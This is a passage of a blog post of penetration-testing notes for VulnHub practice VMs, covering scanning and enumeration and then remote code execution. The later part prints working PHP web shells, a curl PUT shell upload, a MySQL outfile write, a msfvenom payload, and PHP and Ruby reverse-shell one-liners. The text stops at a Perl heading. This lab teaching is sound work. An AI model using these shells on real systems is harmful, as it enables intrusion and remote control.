
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Learning From VulnHub - tech.bitvijays.com</title>
  <meta name="author" content="Vijay Kumar">

  
  <meta name="description" content="This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="tech.bitvijays.com" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">tech.bitvijays.com</a></h1>
  
    <h2>The Magic of Learning.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="bitvijays.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Learning From VulnHub</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-03T22:10:21+05:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:10 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilties.</p>

<!-- more -->


<p><ol></p>

<p><li><strong>Finding the IP address</strong>:</p>

<p><ul>
<li><strong>Netdiscover</strong>:  an active/passive arp reconnaissance tool
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover [options]
</span><span class='line'>-i interface : The network interface to sniff and inject packets.
</span><span class='line'>-r range     : Scan a given range instead of auto scan.
</span><span class='line'>
</span><span class='line'>Example: netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span>Interface name for Virtualization Software</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Virtualbox   : vboxnet
</span><span class='line'>Vmware       : vmnet</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>Nmap</strong>: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>-sP/-sn Ping Scan - disable port scan
</span><span class='line'>Example: nmap -sP/-sn 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li></p>

<p><li><strong>Port Scanning the system</strong>:
<br>
Port scanning provides a large amount of information on open services and possible exploits that target these services.
Two options
<ul>
<li><strong>Unicornscan</strong>:  port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unicornscan [options] X.X.X.X/YY:S-E
</span><span class='line'>-i, &ndash;interface      : interface name, like eth0 or fxp1, not normally required
</span><span class='line'>-m, &ndash;mode           : scan mode, tcp (syn) scan is default, U for udp T for tcp `sf' for tcp connect scan and A for arp
</span><span class='line'>                 for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn|FIN|NO Push|URG)
</span><span class='line'>
</span><span class='line'>Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
</span><span class='line'>Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
</span><span class='line'>
</span><span class='line'>example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>Nmap</strong>: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>HOST DISCOVERY:
</span><span class='line'>-sL: List Scan - simply list targets to scan
</span><span class='line'>-sn: Ping Scan - disable port scan
</span><span class='line'>-Pn: Treat all hosts as online &ndash; skip host discovery
</span><span class='line'>
</span><span class='line'>SCAN TECHNIQUES:
</span><span class='line'>-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span><span class='line'>-sU: UDP Scan
</span><span class='line'>-sN/sF/sX: TCP Null, FIN, and Xmas scans
</span><span class='line'>
</span><span class='line'>PORT SPECIFICATION:
</span><span class='line'>-p &lt;port ranges>: Only scan specified ports
</span><span class='line'>Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
</span><span class='line'>
</span><span class='line'>SERVICE/VERSION DETECTION:
</span><span class='line'>-sV: Probe open ports to determine service/version info
</span><span class='line'>
</span><span class='line'>OUTPUT:
</span><span class='line'>-oN/-oX/-oS/-oG &lt;file>: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.
</span><span class='line'>-oA &lt;basename>: Output in the three major formats at once
</span><span class='line'>-v: Increase verbosity level (use -vv or more for greater effect)
</span><span class='line'>
</span><span class='line'>MISC:
</span><span class='line'>-6: Enable IPv6 scanning
</span><span class='line'>-A: Enable OS detection, version detection, script scanning, and tracerout</span></code></pre></td></tr></table></div></figure>
</li></p>

<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a script for this available at <a href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>

<p><li>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is  usually  SMTP,  port  80  mostly HTTP.   However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.</p>

<p>By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>amap -A 192.168.1.2 12380
</span><span class='line'>amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
</span><span class='line'>
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches http
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches http-apache-2
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches ntp
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches ssl
</span><span class='line'>
</span><span class='line'>Unidentified ports: none.
</span><span class='line'>
</span><span class='line'>amap v5.4 finished at 2016-08-10 05:48:16</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li></p>

<p><br></p>

<p><li><strong>Listen to the interface</strong>: We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
</span><span class='line'>18:02:04.096330 IP 192.168.56.1.4444 &gt; 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
</span><span class='line'>18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28</span></code></pre></td></tr></table></div></figure>
On listening on the port 4444, we recieve a base64 encoded string
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown host
</span><span class='line'>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
</span><span class='line'>&hellip;V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi&hellip;</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>From Nothing to a Unprivileged Shell</strong>:
<br>
At this point, you would have an idea about the different services and service version running on the system.</p>

<p><ol>
<li><strong>searchsploit</strong>: Exploit Database Archive Search.
<br>
First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet.
For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -A 172.16.73.128
</span><span class='line'><strong><strong><strong><strong><strong>Trimmed</strong></strong></strong></strong></strong><strong><strong>
</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
</span><span class='line'>|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|</em>http-title: Site doesn&rsquo;t have a title (text/html; Charset=iso-8859-1).
</span><span class='line'>| ndmp-version:
</span><span class='line'>|_  ERROR: Failed to get host information from server
</span><span class='line'></strong></strong><strong><strong><strong>Trimmed</strong></strong></strong><strong><strong><strong><strong></span></code></pre></td></tr></table></div></figure>
If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# searchsploit webmin
</span><span class='line'></strong></strong></strong></strong><strong>Trimmed</strong><strong><strong><strong><strong><strong><strong>
</span><span class='line'> Description                                                                            Path
</span><span class='line'>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
</span><span class='line'>Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
</span><span class='line'></strong></strong></strong></strong></strong>Trimmed</strong><strong><strong>********</span></code></pre></td></tr></table></div></figure>
</strong>Insert searchsploit -xml options </strong>
</li></p>

<p><li><strong>Webserver Opportunities</strong>?:
If a webserver is running on the machine, we can start with running
<ul>whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
<li>
<strong>PUT Method</strong>: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.</p>

<p>Curl command can be used to check the options available:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl -X OPTIONS -v <a href="http://192.168.126.129/test/">http://192.168.126.129/test/</a>
</span><span class='line'><em>   Trying 192.168.126.129&hellip;
</span><span class='line'></em> Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
</span><span class='line'>&gt; OPTIONS /test/ HTTP/1.1
</span><span class='line'>&gt; Host: 192.168.126.129
</span><span class='line'>&gt; User-Agent: curl/7.47.0
</span><span class='line'>&gt; Accept: <em>/</em>
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; DAV: 1,2
</span><span class='line'>&lt; MS-Author-Via: DAV
</span><span class='line'>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
</span><span class='line'>&lt; Allow: OPTIONS, GET, HEAD, POST
</span><span class='line'>&lt; Content-Length: 0
</span><span class='line'>&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT
</span><span class='line'>&lt; Server: lighttpd/1.4.28
</span><span class='line'>&lt;
</span><span class='line'>* Connection #0 to host 192.168.126.129 left intact</span></code></pre></td></tr></table></div></figure>
The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a>.</p>

<p>The few are
<ul>
<li>
Nmap:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 &ndash;script http-put &ndash;script-args http-put.url=&lsquo;/uploads/rootme.php&rsquo;,http-put.file=&lsquo;/tmp/rootme.php&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
curl:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl &ndash;upload-file test.txt -v &ndash;url <a href="http://192.168.126.129/test/test.txt">http://192.168.126.129/test/test.txt</a></span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl -X PUT -d &lsquo;&lt;?php system($_GET[&ldquo;cmd&rdquo;]);&rsquo; <a href="http://192.168.56.103/test/cmd.php">http://192.168.56.103/test/cmd.php</a></span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li></p>

<p><li>Wordpress: When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn&rsquo;t run it.
Also, scan for plugins
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpsscan
</span><span class='line'>&ndash;url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
</span><span class='line'>&ndash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
</span><span class='line'>&ndash;enumerate | -e [option(s)]        Enumeration.
</span><span class='line'>  option :
</span><span class='line'>    u        usernames from id 1 to 10
</span><span class='line'>    u[10-20] usernames from id 10 to 20 (you must write [] chars)
</span><span class='line'>    p        plugins
</span><span class='line'>    vp       only vulnerable plugins
</span><span class='line'>    ap       all plugins (can take a long time)
</span><span class='line'>    tt       timthumbs
</span><span class='line'>    t        themes
</span><span class='line'>    vt       only vulnerable themes
</span><span class='line'>    at       all themes (can take a long time)
</span><span class='line'>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
</span><span class='line'>  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</span></code></pre></td></tr></table></div></figure>
Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database.</p>

<p>We can also use wordpress to bruteforce password for a username
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan &ndash;url <a href="http://192.168.1.2">http://192.168.1.2</a> &ndash;wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt &ndash;username elliot</span></code></pre></td></tr></table></div></figure></li>
</ul>
<ul>
<li>Names? Possible Usernames? Possible Passwords?:
<br>
Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named &ldquo;namemash.py&rdquo; available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
However, we still have a large amount of usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
<ol>
<li>Using metasploit smtp_enum module:
<br>
Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
</li>
<li>Using VRFY command:</li>
<li>Using RCPT TO command:</li>
</ol></p>

<p></li>
<li>FTP Opportunities:
<br>
If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -rq <a href="ftp://IP">ftp://IP</a>
</span><span class='line'>&ndash;ftp-user=username
</span><span class='line'>&ndash;ftp-password=password</span></code></pre></td></tr></table></div></figure>
</li></p>

<p></ul>
</li>
<li><strong>Remote Code Execution</strong>:
<ul>
<li><strong>MYSQL</strong>: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -n &ldquo;&lt;?php phpinfo(); ?&gt;&rdquo; | xxd -ps
</span><span class='line'>3c3f70687020706870696e666f28293b203f3e</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>select 0x3c3f70687020706870696e666f28293b203f3e into outfile &ldquo;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&rdquo;</span></code></pre></td></tr></table></div></figure></li>
<li>
<strong>Reverse Shells</strong>: Mostly taken from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a> and <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a></p>

<p><ul>
<li>PHP:
We can create a new file say ( shell.php ) on the server containing
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php system($_GET[&ldquo;cmd&rdquo;]); ?&gt;</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php echo shell_exec($_GET[&ldquo;cmd&rdquo;]); ?&gt;</span></code></pre></td></tr></table></div></figure>
which can be accessed by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><a href="http://IP/shell.php?cmd=id">http://IP/shell.php?cmd=id</a></span></code></pre></td></tr></table></div></figure>
or we can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php</span></code></pre></td></tr></table></div></figure>
Weely also generates a webshell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely generate password /tmp/payload.php</span></code></pre></td></tr></table></div></figure>
which can be called by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely <a href="http://192.168.1.2/location_of_payload">http://192.168.1.2/location_of_payload</a> password</span></code></pre></td></tr></table></div></figure>
However, it wasn&rsquo;t as useful as php meterpreter or reverse shell.</p>

<p>PHP Trick:
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php -r &lsquo;$sock=fsockopen(&ldquo;192.168.56.101&rdquo;,1337);exec(&ldquo;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&rdquo;);&rsquo;</span></code></pre></td></tr></table></div></figure>
The above can be connected by listening at port 1337 by using nc
</li>
<li>
Ruby:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby -rsocket -e'f=TCPSocket.open(&ldquo;10.0.0.1&rdquo;,1234).to_i;exec sprintf(&ldquo;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&rdquo;,f,f,f)&lsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Perl:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
